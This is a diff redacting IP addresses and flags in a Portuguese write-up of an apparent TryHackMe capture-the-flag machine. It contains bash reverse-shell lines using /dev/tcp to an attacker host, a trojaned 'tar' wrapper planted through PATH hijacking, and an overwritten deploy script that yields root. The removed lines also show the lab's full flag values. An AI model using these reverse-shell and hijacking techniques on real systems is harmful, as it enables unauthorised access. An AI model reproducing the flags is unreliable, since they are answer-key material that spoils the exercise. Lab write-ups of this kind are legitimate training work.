@@ -26,7 +26,7 @@ Cada etapa da cadeia depende de uma configuração incorreta ou permissão exces
 ### 1.1 Scan de portas
 
 ```bash
-nmap -sV -p- 10.65.163.178
+nmap -sV -p- **.**.***.***
 ```
 
 **Resultado:** apenas portas **21 (FTP)** e **22 (SSH)** abertas.
@@ -34,7 +34,7 @@ nmap -sV -p- 10.65.163.178
 ### 1.2 Enumeração do FTP
 
 ```bash
-ftp 10.65.163.178
+ftp **.**.***.***
 # Login: anonymous
 # Senha: (vazia)
 ```
@@ -76,14 +76,14 @@ Na máquina atacante (Kali):
 ```bash
 cat > shell.sh << 'EOF'
 #!/bin/bash
-bash -i >& /dev/tcp/10.65.77.118/4444 0>&1
+bash -i >& /dev/tcp/**.**.***.***/4444 0>&1
 EOF
 ```
 
 ### 2.3 Upload via FTP
 
 ```bash
-ftp 10.65.163.178
+ftp **.**.***.***
 # anonymous / (enter)
 cd incoming
 put shell.sh
@@ -101,7 +101,7 @@ nc -lvnp 4444
 Após alguns segundos, o pipeline executa o script e a conexão é recebida:
 
 ```
-Connection received on 10.65.163.178 ...
+Connection received on **.**.***.***...
 recon_user@tryhackme-2404:~$
 ```
 
@@ -150,7 +150,7 @@ cat /home/dev_user/flag.txt
 **Flag:**
 
 ```
-THM{8d2b7a41-3f9c-4e55-b1a2-6c7d9e8f0123}
+THM{<**********>}
 ```
 
 ---
@@ -256,7 +256,7 @@ mkdir -p /home/dev_user/bin
 ```bash
 cat > /home/dev_user/bin/tar << 'EOF'
 #!/bin/bash
-bash -i >& /dev/tcp/10.65.91.168/5555 0>&1 &
+bash -i >& /dev/tcp/**.**.***.***/5555 0>&1 &
 exec /bin/tar "$@"
 EOF
 chmod +x /home/dev_user/bin/tar
@@ -275,7 +275,7 @@ nc -lvnp 5555
 A conexão é recebida:
 
 ```
-Connection received on 10.65.163.178 ...
+Connection received on **.**.***.*** ...
 monitor_user@tryhackme-2404:~$
 ```
 
@@ -290,7 +290,7 @@ cat /home/monitor_user/flag.txt
 **Flag:**
 
 ```
-THM{c1e9a7b3-2d44-4a88-9f7e-3b6c2d5a9f77}
+THM{<******************>}
 ```
 
 ---
@@ -345,7 +345,7 @@ Substituir o `deploy_helper.sh` por um reverse shell:
 ```bash
 cat > /opt/app/deploy_helper.sh << 'EOF'
 #!/bin/bash
-bash -i >& /dev/tcp/10.65.91.168/6666 0>&1
+bash -i >& /dev/tcp/**.**.***.***/6666 0>&1
 EOF
 chmod +x /opt/app/deploy_helper.sh
 ```
@@ -409,18 +409,8 @@ cat /root/flag.txt
 **Flag:**
 
 ```
-THM{2b8e6c4a-1d55-4f90-a3c7-5e9d1b7f6a22}
+THM{<*********************>}
 ```
-
----
-
-## 7. Resumo das Flags
-
-| Usuário | Flag |
-|---|---|
-| `dev_user` | `THM{8d2b7a41-3f9c-4e55-b1a2-6c7d9e8f0123}` |
-| `monitor_user` | `THM{c1e9a7b3-2d44-4a88-9f7e-3b6c2d5a9f77}` |
-| `root` | `THM{2b8e6c4a-1d55-4f90-a3c7-5e9d1b7f6a22}` |
 
 ---
 
